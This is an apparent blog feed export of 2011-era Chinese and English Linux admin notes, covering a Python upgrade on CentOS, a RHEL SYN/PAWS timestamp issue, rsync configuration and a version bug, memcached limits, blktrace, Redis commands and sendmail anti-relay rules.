      <content type="html"><![CDATA[<p>CentOS 在当前最新的 5.6 版中，其 python 的版本依然比较落后，还是古老的 2.4。</p><p>但是有些程序需要 2.6 才跑得起来，编译安装的话，又太麻烦，而且不适合菜鸟使用。</p><p>下面就给出使用 yum 升级 python 至 2.6 的简单方案。</p><p> 1: rpm -Uvh <a href="http://download.fedora.redhat.com/pub/epel/5Server/i386/epel-release-5-4.noarch.rpm" target="_blank" rel="noopener">http://download.fedora.redhat.com/pub/epel/5Server/i386/epel-release-5-4.noarch.rpm</a></p><p> 2: yum install libffi -y</p><p> 3: yum install python26 -y</p><p> 4: rm -f /usr/bin/python</p><p> 5: ln -s /usr/bin/python26 /usr/bin/python</p><p>如果是 64 位的 CentOS，则将上述第一句代码中的 i386 改为 x86_64 即可。</p><p>运行完毕后，此时系统默认的 python 已经是 2.6 版了。</p><p>然而，yum 是基于 python2.4 的，因此会出现故障。解决方法也很简单：</p><p> 1: nano /usr/bin/yum</p><p>将第一行末的 python 后加上 2.4，即将第一行改为：</p><p>#!/usr/bin/python2.4</p><p>这样，yum 依然使用 python 2.4 环境运行，一切恢复正常。</p><p>此时我们输入 python -V 即可看到当前的 python 版本：</p><p> 1: # python -V</p><p> 2: Python 2.6.5</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> yum升级python26 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Why does Red Hat Enterprise Linux system does not respond to SYN requests intermittently ?</title>
      <link href="/2011/11/14/why-does-red-hat-enterprise-linux-system-does-not-respond-to-syn-requests-intermittently-2/"/>
      <url>/2011/11/14/why-does-red-hat-enterprise-linux-system-does-not-respond-to-syn-requests-intermittently-2/</url>
      <content type="html"><![CDATA[<h2 id="Why-does-Red-Hat-Enterprise-Linux-system-does-not-respond-to-SYN-requests-intermittently"><a href="#Why-does-Red-Hat-Enterprise-Linux-system-does-not-respond-to-SYN-requests-intermittently" class="headerlink" title="Why does Red Hat Enterprise Linux system does not respond to SYN requests intermittently ?"></a>Why does Red Hat Enterprise Linux system does not respond to SYN requests intermittently ?</h2><h3 id="Article-ID-40006-Created-on-Aug-17-2009-7-48-AM-Last-Modified-Sep-13-2010-6-13-AM"><a href="#Article-ID-40006-Created-on-Aug-17-2009-7-48-AM-Last-Modified-Sep-13-2010-6-13-AM" class="headerlink" title="Article ID: 40006 - Created on: Aug 17, 2009 7:48 AM - Last Modified:  Sep 13, 2010 6:13 AM"></a>Article ID: 40006 - Created on: Aug 17, 2009 7:48 AM - Last Modified:  Sep 13, 2010 6:13 AM</h3><h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><ul><li>Server does not answer some specific SYN Packages.</li><li>Webserver does not respond for some sessions (SYN requests).  SYN Packets being ignored intermittently by RHEL Apache server</li><li>LDAP server occasionally ignoring SYNs</li><li>Any server, regardless of the application layer, may occasionally ignore TCP SYN packets (i.e. a TCP packet with the SYN flag set).</li></ul><h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><ul><li>Red Hat Enterprise Linux 4 and 5 (Webserver/application server)</li><li>Red Hat Enterprise Linux 5.4 (openldap-2.3.43-3.el5)</li></ul><p>This issue has been reported in a environment using NAT (Network Address Translation) like the following:<br>      <strong>Client**</strong>—&gt;<strong><strong>NAT Router</strong></strong>—&gt;<strong>**Server</strong></p><h3 id="Resolution"><a href="#Resolution" class="headerlink" title="Resolution"></a>Resolution</h3><p>Disable TCP time stamps using the following command:</p><pre><code>echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps</code></pre><p>or by adding the following line to /etc/systcl.conf and rebooting the system:</p><pre><code>net.ipv4.tcp_timestamps = 0</code></pre><p>Disabling TCP time stamps will disable PAWS (Protect Against Wrapped Sequences), checking as defined in <a href="http://www.ietf.org/rfc/rfc1323.txt" target="_blank" rel="noopener">RFC 1323</a>.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>In a TCP dump of the affected packets, the TSVal of SYN packet is a lower value than the preceding packet.</p><pre><code>Packet #30 from x.x.x.x to y.y.y.y has a TSval of 773695118Packet #33 from x.x.x.x to y.y.y.y has a TSval of 470318331</code></pre><p>In above TCP trace, packet #33 has a TSval of 470318331 which is lower than its preceding one. As PAWS checking is enabled in the TCP stack, it doesn’t send an acknowledge (SYN-ACK) back to the peer.</p><p>PAWS assumes that every received TCP segment (including data and ACK segments) contains a timestamp (SEG.TSval) whose values are non-decreasing in time. The basic idea is that a segment can be discarded as an old duplicate if it is received with a timestamp (SEG.TSval) less than some timestamp recently received on this connection.</p><p>Timestamp issues often indicate a problem with firewalls or NAT routers.</p><h3 id="Diagnostic-Steps"><a href="#Diagnostic-Steps" class="headerlink" title="Diagnostic Steps"></a>Diagnostic Steps</h3><h6 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h6><p>Since the server is not heavily loaded, you may at first suspect this issue to be an issue with socket exhaustion.  However, checking the output of “netstat -paunt” will reveal that there are only a couple of active connections.</p><h6 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h6><p>Increasing the size of syn backlog queue (net.ipv4.tcp_max_syn_backlog) doesn’t seem to help.</p><h6 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h6><p>Collecting a TCP dump from the server using a command like the following:</p><pre><code>tcpdump -s0 -w /tmp/tcpdump.pcap -i any host &lt;client ip&gt; and port 80</code></pre><p>and generating traffic (HTTP or LDAP) to the server captures evidence of the server not responding to the TCP SYN packets.  The output file can be analyzed with a command like</p><pre><code>tcpdump -r /&lt;path&gt;/&lt;to&gt;/tcpdump.pcap</code></pre><p>or <a href="http://www.wireshark.org/" target="_blank" rel="noopener">Wireshark</a> can be used to analyze the TCP dump file graphically.  Wireshark is a standard package in most Red Hat Enterprise Linux and Fedora distributions.  Analysis of the TCP dump should show cases where the client will send several TCP SYN packets to the host, but the host will not respond.  Further analysis should show that the TSVal of the SYN packets is less than a preceding TCP packet.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用xcutsel在vncviewer中传输剪贴板内容</title>
      <link href="/2011/11/03/use-xcutsel-to-transmit-clipboard-contents-in-vncviewer/"/>
      <url>/2011/11/03/use-xcutsel-to-transmit-clipboard-contents-in-vncviewer/</url>
      <content type="html"><![CDATA[<p>找到了如下方法支持clipboard传输：  </p><p>在xstartup的最后一行加入命令：  </p><p>xcutsel &amp;  </p><p>这样在gnome桌面环境启动后会出现一个小小的程序，里面有3项：<br>1，quit<br>2，copy primary to 0<br>3，copy 0 to primary  </p><p>在WinXP中复制ASCII内容后，点击3:copy 0 to primary，然后在gnome环境中点击鼠标中键，即可实现clipboard transfer。  </p><p>同理，在gnome环境中复制ASCII内容后，点击2:copy primary to 0，然后就可以复制到WinXP中了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vncviewer </tag>
            
            <tag> xcutsel </tag>
            
            <tag> 传输剪贴板 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在redhat5.4/5.5/5.6中默认的rsync出现的bug</title>
      <link href="/2011/10/17/the-default-rsync-bug-in-redhat5-4-5-5-5-6/"/>
      <url>/2011/10/17/the-default-rsync-bug-in-redhat5-4-5-5-5-6/</url>
      <content type="html"><![CDATA[<p>测试环境为：</p><p>Client(192.168.1.3)——————–àdaemon(192.168.1.2)</p><p>———————–配置过的先略过，直接看测试过程—————-</p><p>服务端配置：</p><p>/etc/rsyncd/Rsyncd.conf配置</p><p># Minimal configuration file for rsync daemon</p><p># See rsync(1) and rsyncd.conf(5) man pages for help</p><p># This line is required by the /etc/init.d/rsyncd script</p><p>pid file = /var/run/rsyncd.pid  </p><p>port = 873</p><p>address = 192.168.1.2</p><p>uid = test</p><p>gid = test</p><p>auth users = test</p><p>secrets file = /etc/rsyncd/rsyncd.secrets </p><p>#incoming chmod = u+rwx,g+rwx,o+rx</p><p>use chroot = yes </p><p>read only = no </p><p>#limit access to private LANs</p><p>hosts allow=192.168.1.3/255.255.255.255</p><p>hosts deny=*</p><p>max connections = 500</p><p>#This will give you a separate log file</p><p>log file = /var/log/rsync.log</p><p>#This will log every file transferred - up to 85,000+ per user, per sync</p><p>#transfer logging = yes</p><p>log format = %t %a %m %f %b</p><p>syslog facility = local3</p><p>timeout = 300</p><p>[app]  </p><p>path = /app/test（目标目录）</p><p>list=yes</p><p>#ignore errors</p><p>/etc/rsyncd/rsyncd.secrets  配置</p><p>test:123456（密码）</p><p>启动服务端/usr/bin/rsync –daemon –config=/etc/rsyncd/rsyncd.conf</p><p>客户端配置</p><p>客户端：</p><p>/etc/rsync_client.pass</p><p>123456（密码）</p><p>rsync -av  –password-file=/etc/rsync_client.pass /boot <a href="mailto:audit@192.168.1.2::app" target="_blank" rel="noopener">test@192.168.1.2::app</a></p><p>————————————————————-配置完成————————————————-</p><p>测试过程：</p><p>rsync -av  –password-file=/etc/rsync_client.pass /boot <a href="mailto:audit@192.168.1.2::app" target="_blank" rel="noopener">test@192.168.1.2::app</a></p><p>结果正确，没有出现问题</p><p>再进行</p><p>rsync -av  –password-file=/etc/rsync_client.pass /home <a href="mailto:audit@192.168.1.2::app" target="_blank" rel="noopener">test@192.168.1.2::app</a></p><p>结果也正确，没有出现问题</p><p>再进行</p><p>rsync -av  –password-file=/etc/rsync_client.pass /etc <a href="mailto:audit@192.168.1.2::app" target="_blank" rel="noopener">test@192.168.1.2::app</a></p><p>这回报错了</p><p>出现如下错误：</p><p>unexpected tag 3 [sender]</p><p>rsync error: error in rsync protocol data stream (code 12) at io.c(828)</p><p>[sender=2.6.8]</p><p>而此时服务端的错误日志如下：</p><p>2008/11/12 00:25:42 [12657] rsync: read error: Connection reset by peer (104)</p><p>2008/11/12 00:25:42 [12657] rsync error: error in rsync protocol data stream</p><p>(code 12) at io.c(614) [receiver=2.6.8]</p><p>2008/11/12 00:25:42 [12657] rsync: connection unexpectedly closed (486 bytes</p><p>received so far) [generator]</p><p>2008/11/12 00:25:42 [12657] rsync error: error in rsync protocol data stream</p><p>(code 12) at io.c(463) [generator=2.6.8]</p><p>再同步一次就成功。</p><p>把服务端下已经同步的文件删除，再不尝试一次</p><p>rsync -av  –password-file=/etc/rsync_client.pass /etc <a href="mailto:audit@192.168.1.2::app" target="_blank" rel="noopener">test@192.168.1.2::app</a></p><p>还是报错。文件只同步了部分文件，发现在同步的源文件中如果文件数太多，或者子目录太多，就经常会出现这一种情况。</p><p>根据多次查找发现在2.6.8上会出现这一个问题，在2.6.9上已经解决，经查看在redhat5.4，5.5和5.6的发行版中都是使用rsync-2.6.8的版本。</p><p><a href="http://rsync.samba.org/ftp/rsync/src/rsync-2.6.9-NEWS" target="_blank" rel="noopener">http://rsync.samba.org/ftp/rsync/src/rsync-2.6.9-NEWS</a>在官方上看到了更新日志</p><p>- Fixed a bug where a deferred info/error/log message could get sent directly to the sender instead of being handled by rwrite() in the generator. This fixes an “unexpected tag 3” fatal error, and should also fix a potential problem where a deferred info/error message from the receiver might bypass the log file and get sent only to the client process. (These problems could only affect an rsync daemon that was receiving files.)</p><p>Redhat上的bug报告文件如下：</p><p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=471182" target="_blank" rel="noopener">https://bugzilla.redhat.com/show_bug.cgi?id=471182</a></p><p>解决方法：</p><p>升级rsync到2.6.9以上，只需要升级服务器端就可以了！因为这一个bug只会影响服务端的接收。</p><p>在redhat5.7中已经默认修复了这一个问题。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsync </tag>
            
            <tag> 3 </tag>
            
            <tag> io.c </tag>
            
            <tag> tag </tag>
            
            <tag> unexpected </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>memcached对key和value的限制</title>
      <link href="/2011/10/12/memcached-limits-key-and-value/"/>
      <url>/2011/10/12/memcached-limits-key-and-value/</url>
      <content type="html"><![CDATA[<p>memcached的简单限制就是键（key）和item的限制。最大键长为250个字符。可以接受的储存数据不能超过1MB，因为这是典型slab 的最大值。这里我们可以突破对key长度的限制。<br>问题解决：<br>修改memcached源文件。在memcached.h中定义key的长度，其代码为：  </p><p>#define KEY_MAX_LENGTH 250  </p><p>更换为所需要的长度，比如：1024</p><p>#define KEY_MAX_LENGTH 1024  </p><p>而value的默认限制为1M</p><p>-I            Override the size of each slab page. Adjusts max item size<br>              (default: 1mb, min: 1k, max: 128m)</p><p>要增加的话，启动时添加-I 10m参数就可以。</p><p>会有一个警告：</p><p>WARNING: Setting item max size above 1MB is not recommended!<br> Raising this limit increases the minimum memory requirements<br> and will decrease your memory efficiency.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> key </tag>
            
            <tag> memcahced </tag>
            
            <tag> value </tag>
            
            <tag> 限制 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>rsync配置</title>
      <link href="/2011/10/09/rsync-configuration/"/>
      <url>/2011/10/09/rsync-configuration/</url>
      <content type="html"><![CDATA[<p>/etc/rsyncd/Rsyncd.conf配置</p><p># Minimal configuration file for rsync daemon</p><p># See rsync(1) and rsyncd.conf(5) man pages for help</p><p># This line is required by the /etc/init.d/rsyncd script</p><p>pid file = /var/run/rsyncd.pid  </p><p>port = 873</p><p>address = 192.168.100.3</p><p>uid = audit</p><p>gid = audit</p><p>auth users = audit</p><p>secrets file = /etc/rsyncd/rsyncd.secrets </p><p>#incoming chmod = u+rwx,g+rwx,o+rx</p><p>use chroot = yes </p><p>read only = no </p><p>#limit access to private LANs</p><p>hosts allow=192.168.96.0/255.255.255.0</p><p>hosts deny=*</p><p>max connections = 500</p><p>#This will give you a separate log file</p><p>log file = /var/log/rsync.log</p><p>#This will log every file transferred - up to 85,000+ per user, per sync</p><p>#transfer logging = yes</p><p>log format = %t %a %m %f %b</p><p>syslog facility = local3</p><p>timeout = 300</p><p>[app]  </p><p>path = /app/audit（目标目录）</p><p>list=yes</p><p>#ignore errors</p><p>/etc/rsyncd/rsyncd.secrets  配置</p><p>audit:skymobi（密码）</p><p>启动服务端/usr/bin/rsync –daemon –config=/etc/rsyncd/rsyncd.conf</p><p>客户端：</p><p>/etc/rsync_client.pass</p><p>Skymobi（密码）</p><p>rsync -av  –password-file=/etc/rsync_client.pass /usr/local/httpd/htdocs/sms/vsms/sessions/ <a href="mailto:audit@192.168.100.3::app" target="_blank" rel="noopener">audit@192.168.100.3::app</a></p><p>如果害怕把带宽跑满就加上限速功能</p><p>–bwlimit=KBPS          limit I/O bandwidth; KBytes per second</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsync </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>blktrace使用简析</title>
      <link href="/2011/10/09/the-blktrace-uses-a-simplified-analysis/"/>
      <url>/2011/10/09/the-blktrace-uses-a-simplified-analysis/</url>
      <content type="html"><![CDATA[<p>blktrace是一个针对Linux内核中块设备I/O层的跟踪工具，是由Linux内核块设备层的维护者开发的，目前已经集成到内核2.6.17及其之后的内核版本中。通过使用这个工具，使用者可以获取I/O请求队列的各种详细的情况，包括进行读写的进程名称、进程号、执行时间、读写的物理块号、块大小等等，是一个Linux下分析I/O相关内容的很好的工具，在使用时基本上只会占用系统2%的资源，下面主要说一下本人在blktrace上手时的一些心得。<br>    因为blktrace已经集成到2.6.17及其之后的版本中，所以一般比较新的系统版本都无需下载，本人使用的是Fedora 8，内核版本为2.6.23，但是此工具并未安装，所以需要在使用前安装blktrace：<br>yum install blktrace<br>通过以上命令安装完成后，需要手工设定debug文件系统，命令如下：<br>mount -t debugfs debugfs /sys/kernel/debug<br>这样blktrace就可以成功运行了。<br>    blktrace的运行命令可以包括许多的详细配置，一一列举起来实在太多，而且没有必要，下面通过几个例子来直观的说明常用的几个监测功能：<br>运行命令1：<br>blktrace -d /dev/sda -o - |blkparse -i -<br>此命令是将blktrace的结果输出到屏幕，然后blkparse将屏幕中的blktrace的结果作为分析的输入，最后将分析的结果同样输出到屏幕。这里需要指出的是，blkparse是基于blktrace的分析工具，因为blktrace本身并不具有分析功能，它只是进行监测，其余的工作都是由blkparse来进行的。<br>运行命令2：<br>blktrace -d /dev/sda |blkparse -i -<br>此命令是将blktrace的结果输出到本地文件夹，文件名为sda.blktrace.0和sda.blktrace.1，这里之所以有两个文件是因为运行机器有两个CPU的缘故，blktrace根据CPU的个数来生成文件，对应每个CPU都有一个相应的监测数据文件。<br>运行命令3：<br>blktrace -d /dev/sda -o trace |blkparse -i -<br>此命令是将blktrace的结果输出到已经事先指定好的文件trace中，注意这个trace文件必须在本地文件夹中存在，无需带有任何后缀</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blktrace使用简析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Redis 命令小结</title>
      <link href="/2011/09/30/redis-orders-the-summary/"/>
      <url>/2011/09/30/redis-orders-the-summary/</url>
      <content type="html"><![CDATA[<p><a href="http://redis.io/commands" target="_blank" rel="noopener">http://redis.io/commands</a></p><p><strong>连接控制</strong></p><p>QUIT 关闭连接</p><p>AUTH (仅限启用时)简单的密码验证</p><p><strong>适合全体类型的命令</strong></p><p>EXISTS key 判断一个键是否存在;存在返回 1;否则返回0;</p><p>DEL key 删除某个key,或是一系列key;DEL key1 key2 key3 key4</p><p>TYPE key 返回某个key元素的数据类型 ( none:不存在,string:字符,list,set,zset,hash)</p><p>KEYS pattern 返回匹配的key列表 (KEYS foo<em>:查找foo开头的keys),KEYS </em> 就列出所有的key了，当然，复杂度O(n)</p><p>RANDOMKEY 随机获得一个已经存在的key，如果当前数据库为空，则返回空字符串</p><p>RENAME oldname newname更改key的名字，新键如果存在将被覆盖</p><p>RENAMENX oldname newname 更改key的名字，如果名字存在则更改失败</p><p>DBSIZE返回当前数据库的key的总数</p><p>EXPIRE设置某个key的过期时间（秒）,(EXPIRE bruce 1000：设置bruce这个key1000秒后系统自动删除)注意：如果在还没有过期的时候，对值进行了改变，那么那个值会被清除。</p><p>TTL查找某个key还有多长时间过期,返回时间秒</p><p>SELECT index 选择数据库</p><p>MOVE key dbindex 将指定键从当前数据库移到目标数据库 dbindex。成功返回 1;否则返回0（源数据库不存在key或目标数据库已存在同名key）;</p><p>FLUSHDB 清空当前数据库中的所有键</p><p>FLUSHALL 清空所有数据库中的所有键</p><p><strong>处理字符串的命令</strong></p><p>SET key value 给一个键设置字符串值。SET keyname datalength data (SET bruce 10 paitoubing:保存key为burce,字符串长度为10的一个字符串paitoubing到数据库)，data最大不可超过1G。</p><p>GET key获取某个key 的value值。如key不存在，则返回字符串“nil”；如key的值不为字符串类型，则返回一个错误。</p><p>GETSET key value可以理解成获得的key的值然后SET这个值，更加方便的操作 (SET bruce 10 paitoubing,这个时候需要修改bruce变成1234567890并获取这个以前的数据paitoubing,GETSET bruce 10 1234567890)</p><p>MGET key1 key2 … keyN 一次性返回多个键的值</p><p>SETNX key value SETNX与SET的区别是SET可以创建与更新key的value，而SETNX是如果key不存在，则创建key与value数据</p><p>MSET key1 value1 key2 value2 … keyN valueN 在一次原子操作下一次性设置多个键和值</p><p>MSETNX key1 value1 key2 value2 … keyN valueN 在一次原子操作下一次性设置多个键和值（目标键不存在情况下，如果有一个以上的key已存在，则失败）</p><p>INCR key 自增键值</p><p>INCRBY key integer 令键值自增指定数值</p><p>DECR key 自减键值</p><p>DECRBY key integer 令键值自减指定数值</p><p><strong>处理 lists 的命令</strong></p><p>RPUSH key value 从 List 尾部添加一个元素（如序列不存在，则先创建，如已存在同名Key而非序列，则返回错误）</p><p>LPUSH key value 从 List 头部添加一个元素</p><p>LLEN key 返回一个 List 的长度</p><p>LRANGE key start end从自定的范围内返回序列的元素 (LRANGE testlist 0 2;返回序列testlist前0 1 2元素)</p><p>LTRIM key start end修剪某个范围之外的数据 (LTRIM testlist 0 2;保留0 1 2元素，其余的删除)</p><p>LINDEX key index返回某个位置的序列值(LINDEX testlist 0;返回序列testlist位置为0的元素)</p><p>LSET key index value更新某个位置元素的值</p><p>LREM key count value 从 List 的头部（count正数）或尾部（count负数）删除一定数量（count）匹配value的元素，返回删除的元素数量。</p><p>LPOP key 弹出 List 的第一个元素</p><p>RPOP key 弹出 List 的最后一个元素</p><p>RPOPLPUSH srckey dstkey 弹出 _srckey_ 中最后一个元素并将其压入 _dstkey_头部，key不存在或序列为空则返回“nil”</p><p><strong>处理集合(sets)的命令（有索引无序序列）</strong></p><p>SADD key member增加元素到SETS序列,如果元素（membe）不存在则添加成功 1，否则失败 0;(SADD testlist 3 \n one)</p><p>SREM key member 删除SETS序列的某个元素，如果元素不存在则失败0，否则成功 1(SREM testlist 3 \N one)</p><p>SPOP key 从集合中随机弹出一个成员</p><p>SMOVE srckey dstkey member 把一个SETS序列的某个元素 移动到 另外一个SETS序列 (SMOVE testlist test 3\n two;从序列testlist移动元素two到 test中，testlist中将不存在two元素)</p><p>SCARD key 统计某个SETS的序列的元素数量</p><p>SISMEMBER key member 获知指定成员是否存在于集合中</p><p>SINTER key1 key2 … keyN 返回 key1, key2, …, keyN 中的交集</p><p>SINTERSTORE dstkey key1 key2 … keyN 将 key1, key2, …, keyN 中的交集存入 dstkey</p><p>SUNION key1 key2 … keyN 返回 key1, key2, …, keyN 的并集</p><p>SUNIONSTORE dstkey key1 key2 … keyN 将 key1, key2, …, keyN 的并集存入 dstkey</p><p>SDIFF key1 key2 … keyN 依据 key2, …, keyN 求 key1 的差集。官方例子：</p><p>key1 = x,a,b,c</p><p>key2 = c</p><p>key3 = a,d</p><p>SDIFF key1,key2,key3 =&gt; x,b</p><p>SDIFFSTORE dstkey key1 key2 … keyN 依据 key2, …, keyN 求 key1 的差集并存入 dstkey</p><p>SMEMBERS key 返回某个序列的所有元素</p><p>SRANDMEMBER key 随机返回某个序列的元素</p><p><strong>处理有序集合(sorted sets)的命令 (zsets)</strong></p><p>ZADD key score member 添加指定成员到有序集合中，如果目标存在则更新score（分值，排序用）</p><p>ZREM key member 从有序集合删除指定成员</p><p>ZINCRBY key increment member 如果成员存在则将其增加_increment_，否则将设置一个score为_increment_的成员</p><p>ZRANGE key start end 返回升序排序后的指定范围的成员</p><p>ZREVRANGE key start end 返回降序排序后的指定范围的成员</p><p>ZRANGEBYSCORE key min max 返回所有符合score &gt;= min和score &lt;= max的成员 ZCARD key 返回有序集合的元素数量 ZSCORE key element 返回指定成员的SCORE值 ZREMRANGEBYSCORE key min max 删除符合 score &gt;= min 和 score &lt;= max 条件的所有成员</p><p><strong>排序（List, Set, Sorted Set）</strong></p><p>SORT key BY pattern LIMIT start end GET pattern ASC|DESC ALPHA 按照指定模式排序集合或List</p><p>SORT mylist</p><p>默认升序 ASC</p><p>SORT mylist DESC</p><p>SORT mylist LIMIT 0 10</p><p>从序号0开始，取10条</p><p>SORT mylist LIMIT 0 10 ALPHA DESC</p><p>按首字符排序</p><p>SORT mylist BY weight_*</p><p>SORT mylist BY weight_<em> GET object_</em></p><p>SORT mylist BY weight_<em> GET object_</em> GET #</p><p>SORT mylist BY weight_* STORE resultkey</p><p>将返回的结果存放于resultkey序列（List）</p><p><strong>持久控制</strong></p><p>SAVE 同步保存数据到磁盘</p><p>BGSAVE 异步保存数据到磁盘</p><p>LASTSAVE 返回上次成功保存到磁盘的Unix时间戳</p><p>SHUTDOWN 同步保存到服务器并关闭 Redis 服务器（SAVE+QUIT）</p><p>BGREWRITEAOF 当日志文件过长时重写日志文件</p><p><strong>远程控制命令</strong></p><p>INFO 提供服务器的信息和统计信息</p><p>MONITOR 实时输出所有收到的请求</p><p>SLAVEOF 修改复制选项</p><p><strong>redis目前提供四种数据类型：string,list,set及zset(sorted set)。</strong></p><p>* string是最简单的类型，你可以理解成与Memcached一模一个的类型，一个key对应一个value，其上支持的操作与Memcached的操 作类似。但它的功能更丰富。</p><p>* list是一个链表结构，主要功能是push、pop、获取一个范围的所有值等等。操作中key理解为链表的名字。</p><p>* set是集合，和我们数学中的集合概念相似，对集合的操作有添加删除元素，有对多个集合求交并差等操作。操作中key理解为集合的名字。</p><p>* zset是set的一个升级版本，他在set的基础上增加了一个顺序属性，这一属性在添加修改元素的时候可以指定，每次指定后，zset会自动重新按新的 值调整顺序。可以理解了有两列的mysql表，一列存value，一列存顺序。操作中key理解为zset的名字。</p><p>协议</p><p>redis目前只有基于TCP的文本协议，与memcache类似，有一些改进。</p><p>客户端通常发送</p><p>命令 参数… 值字节数\r\n</p><p>值\r\n</p><p>服务端的返回，根据第一个字节，可以判断：</p><p>- 错误信息</p><p>+ 普通文本信息</p><p>$ 变长字节数，$6表示CRLF之后有6个字节的字符</p><p>: 返回一个整数</p><p>* 返回组数，即*6表示CRLF之后将返回6组变长字符</p><p>注意事项：</p><p>Key不可包含空格或者回车符</p><p>Key不要过长或过短，应使其有意义，如”comment:1234:reply.to”</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> 命令小结 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sendmail 8.9.3中的Mail Relay规则简介</title>
      <link href="/2011/09/20/an-introduction-to-mail-relay-rules-in-sendmail-8-9-3/"/>
      <url>/2011/09/20/an-introduction-to-mail-relay-rules-in-sendmail-8-9-3/</url>
      <content type="html"><![CDATA[<p><strong>一.什么是第三方的Mail Relay?    </strong>当一台邮件服务器处理一封邮件时，该封邮件的发送者(the sender)和接收者(the recipient)都不是本地用户（local user),即发送者和接收者都处于本地域之外，该邮件服务器对于这封邮件的传送完全属于不相关的第三方，因此Mail Relay被sedmail默认禁止了。这阻止了Spammer利用你的服务器发送垃圾邮件。<br><strong>二.为什么你要停止第三方的Mail Relay?    </strong>如果你的邮件服务器不能有效地控制第三方的mail relay，你应该立刻着手解决这个问题，不要等待spammer 来攻击你的邮件主机，主要是因为：<br>a.大量的垃圾邮件（junk email）可能会使你的邮件系统崩溃。它们占用你的磁盘空间，CPU资源，还可能引发Dos类型攻击（denial of  service attack).<br>b.你的组织可能被列入黑名单（backlist)。由于大量垃圾邮件从你的主机发出，其它一些组织或公司可能会不做任何更深的调查就更改设置阻止了从你的主机来的任何邮件，这也将同时阻止从你的站点发到它们的所有正常的商业性邮件,损失不可估量.<br>c.意识到这种攻击将会发生在你身上。不要因为它没有发生就意味着你是安全的。他们每天正用一些自动扫描的工具去扫描网络而寻找那些对他们打开relay功能的邮件主机。他们可能自己写了某个程序正每刻地进行扫描，如果你的邮件主机是易受攻击的，那么扫描到你就是迟早的事情。<br><strong>    三. Sendmail(8.9.3)如何relay你的邮件？    </strong>      如果发送者和接收者都不属于本地域，sendmail将默认禁止mail relay. 要想使得sendmail relay<br>你的邮件，可以有下面两种途径，你必须确保发送者或者接收者其中至少有一个属于本地域.<br>a. 本地发送者到外部接收者(local sender to external recipient)    </p><h1 id="b-外部发送者到本地接收者-external-sender-to-local-recipient"><a href="#b-外部发送者到本地接收者-external-sender-to-local-recipient" class="headerlink" title="b. 外部发送者到本地接收者(external sender to local recipient)    "></a>b. 外部发送者到本地接收者(external sender to local recipient)    </h1><p>c. 何为本地发送者（local sender)?<br>当邮件服务器接收到一封从其它机器（如windows pc)发来的邮件时，它首先检查连接进来的主机的域名和 IP地址，注意：<br>决不是检查这封邮件的信封里的发送者地址（not based on the envelope MAIL FROM address!)<br>(要了解一封邮件的全部信封头信息，参考（<a href="http://www.stopspam.org/email/headers/headers.html）" target="_blank" rel="noopener">http://www.stopspam.org/email/headers/headers.html）</a>)<br>如果你是拨号用户，IP地址当然是你拨到ISP所得到的动态IP地址，然后你的主机名/域名是由你的ISP对你的IP<br>地址作反向DNS解析出来的主机名/域名，<br>不过大多数ISP不作这个，因此，sendmail将仅仅记录你连接进来的IP地址，由此判断是否这个地址被允许relay mail.对sendmail<br>8.9.3来说，最通常的用来检查是否relay邮件的配置文件是/etc/mail/relay-domains,它能对IP地址或域名进行判断是否允许relay.<br>如果这一步不允许，再检查/etc/mail/access（它能被通过加FEATURE(access_db)到.mc文件再用m4生成/etc/sendmail.cf所激活<br>附:本文讨论的所有设置都是基于M4宏命令生成的/etc/sendmail.cf）<br>d. 何为本地接收者（local recipient ）？<br>决定接收者邮件地址是否为本地的不是件轻松的事情，sendmail认为类w中的所有主机/域为本地接收者，也就是/etc/mail/sendmail.cw文件或者/etc/sendmail.cf中的Cw类定义后面列出的所有主机或域名。为了激活对/etc/mail/sendmail.cw的检查,使用特性Feature(use_cw_file)。但是这还不够，因为这个能被愚弄的，如.<br>因此sendmail用规则集(ruleset)先移走这个地址的本地部分(<br>@local.site)后，如果仍有一些域，则考虑是否能通过relay检查，另外，sendmail也还检查/etc/mail/access<br>决定是否有项目匹配接收者地址所在的域，根据相应标记确定是否被允许接收。 </p><p><strong>四. Sendmail 8.9.3: anti-relaying（拒绝传递）怎么工作？   </strong>a. 如果Mail From:行有下面的参数，sendmail拒绝mail relay:<br>1.发送者的域名不能被解析。这个能用FEATURE(accept_unresolvable_domains)被禁止。<br>2.非全称的域名。能被用FEATURE(accept_unresolvable_domains)禁止。<br>3.与access map（ /etc/mail/access）中的一项匹配。<br>域名：如spammer.domain  reject<br>全称email地址：如spammer@domain reject<br>邮件地址的用户名部分：如spammer@  reject<br>或者不用’reject’用’error code error text’<br>spammer.domain “501 No e-mail from this domain.”<br>spammer@domain “501 No e-mail from your address.”<br>spammer@ “501 Get a real address.”<br>甚至用DISCARD 